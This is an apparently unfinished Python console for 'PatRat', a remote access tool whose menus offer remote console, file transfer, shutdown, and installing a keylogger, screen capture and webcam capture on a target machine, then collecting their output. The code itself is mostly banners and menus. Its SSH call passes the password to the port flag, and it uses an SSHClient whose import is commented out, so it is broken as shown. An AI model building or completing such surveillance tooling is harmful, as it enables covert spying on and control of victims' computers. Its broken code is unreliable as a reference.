#!/usr//bin/python
# python console for PatRat
# created by : nadav manne
#from paramiko import SSHClient
# imports
import getpass
import os
import sys
from modules import *
import sys
import os
import socket
import time
import base64
import tabulate
import signal
import subprocess
import argparse
import shutil
import threading
import platform
import PyInstaller.__main__
from datetime import datetime

from datetime import datetime
# varietals


# from paramiko import SSHClient
banner = """

 /$$$$$$$             /$$     /$$$$$$$              /$$    
| $$__  $$           | $$    | $$__  $$            | $$    
| $$  \ $$ /$$$$$$  /$$$$$$  | $$  \ $$  /$$$$$$  /$$$$$$  
| $$$$$$$/|____  $$|_  $$_/  | $$$$$$$/ |____  $$|_  $$_/  
| $$____/  /$$$$$$$  | $$    | $$__  $$  /$$$$$$$  | $$    
| $$      /$$__  $$  | $$ /$$| $$  \ $$ /$$__  $$  | $$ /$$
| $$     |  $$$$$$$  |  $$$$/| $$  | $$|  $$$$$$$  |  $$$$/
|__/      \_______/   \___/  |__/  |__/ \_______/   \___/                                                             
  
  
        [::] The PatRat You'll Ever Need [::]
        [::] Created By : Nadav Mannes [::]                                                      
"""
help_menu = """
        [+] Arguments:
            <username>.rat = configuration file 
        [+] Example:
            PatRat nadav.rat
"""

help_menu2 =  """
        [::] The PatRat You'll Ever Need [::]
        [::] Created By : Nadav Mannes [::]  
        
        Arguments:
            -t <ipaddress> = run PAtRat on target ip address
            -f <config file> = run PatRat on config file from installer
        
        Example:
            python3 main.py -t 10.0.0.35
            python3 main.py -f nadav.rat
"""

# option menu
options_menu = """
        [+] Command and Control:
            [orconsole] ------ Remote Console
            [fix orconsole] -- Fix Remote Console
            [upload] --------- Upload File 
            [download] ------- Download File
            [restart] -------- Restart Target PC
            [shutdown] ------- Shutdown Target PC
            [kills-witch] ----- Removes PatRat From Target
        [+] Reconnaissance:
            [install keylogger] ------ Install Keylogger
            [install screencapture] -- Install ScreenCapture
            [install webcam] --------- Install WebCam Capture
            [grab keylogs] ----------- Grab Keylogs
            [grab screenshots] ------- Grab ScreenShots From ScreenCapture
            [grab webcam] ------------ Grab WebCam Photos
        [+] Options:
            [help] ------- Help Menu
            [man] -------- PatRat Manual
            [config] ----- Display RAT File
            [version] ---- Version Number
            [update] ----- Update PatRat
            [uninstall] -- Uninstall PatRat
            [quit] ------- Quit
            * any other commands will be 
              sent through your terminal
        [*] Select an [option]...
"""


class PULL:
    WHITE = '\033[1m\033[0m'
    PURPLE = '\033[1m\033[95m'
    CYAN = '\033[1m\033[96m'
    DARKCYAN = '\033[1m\033[36m'
    BLUE = '\033[1m\033[94m'
    GREEN = '\033[1m\033[92m'
    YELLOW = '\033[1m\033[93m'
    RED = '\033[1m\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    LINEUP = '\033[F'


def logo(self):
    print(self.DARKCYAN + banner % self.YELLOW + self.END)


# gets arguments
def parser():
    pass

# get username
username = getpass.getuser()
header = f"{username}@patrat $ "


#read config file
def read_config(config_file):
    configuration = {}


    read_lines = open(config_file, "r").readlines()

    # get target configuration
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["WORKINGDIRACTORY"] = read_lines[2].strip()

    return configuration

# TODO: clean this
def os_detection():
    # Window
    if os.name == "nt":
        return "W"
    # other
    if os.name == "posix":
        return "l"


# connect rat to target
def connect():
    configuration = read_config(sys.argv[1])

    # get config info
    ipv4 = configuration.get("IPADDRESS")
    password = configuration.get("PASSWORD")
    working_directory = configuration.get("WORKINGDIRACTORY")

    # remotely connect
    os.system(f"ssh -p \"{password}\" patrat@{ipv4}")

    # from paramiko import SSHClient

    client =SSHClient()
    client.connect('example.com', username='user', password='secret')
    client.close()
    #os.system(password)

# command line interface
def cli(arguments):
    # display banner
    print(banner)
    print(options_menu)
    # if argument exist
    if arguments:
        print(options_menu)

        option = input(f"{header}")

        if option == "0":
            connect()
        # print(read_config("test.rat"))


    # if argument don't exist
    else:
        print(help_menu)


# main code
def main():
    # checks for arguments
    try:
        sys.argv[1]
    except IndexError:
        arguments_exist = False
    else:
        arguments_exist = True

    # run command line
    cli(arguments_exist)
    pass


if __name__ == '__main__':
    main()
